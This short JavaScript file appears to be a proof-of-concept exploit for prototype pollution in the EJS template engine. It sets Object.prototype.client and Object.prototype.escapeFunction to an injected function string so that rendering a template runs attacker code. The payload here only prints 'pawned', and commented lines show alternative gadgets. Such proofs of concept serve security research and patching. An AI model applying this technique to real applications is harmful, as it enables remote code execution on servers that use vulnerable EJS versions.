const ejs = require('ejs');

const obj = {};
const data = {
    user: {name: 'hey'},
    name: 'flub'
};

// obj['__proto__']['localsName'] = 'user';
// obj['__proto__']['localsName'] = '+';

Object.prototype.client = 'true'; // something non-falsy
// the function to execute
Object.prototype.escapeFunction = 'function (param) {console.log("pawned")}';

const str = '<% if (user) { %>\n' +
    '  <h2><%= user.name %></h2>\n' +
    '<% } %>'

ejs.render(str, data)

// console.log(ejs.compile(str, {
//     client: true
// })(data));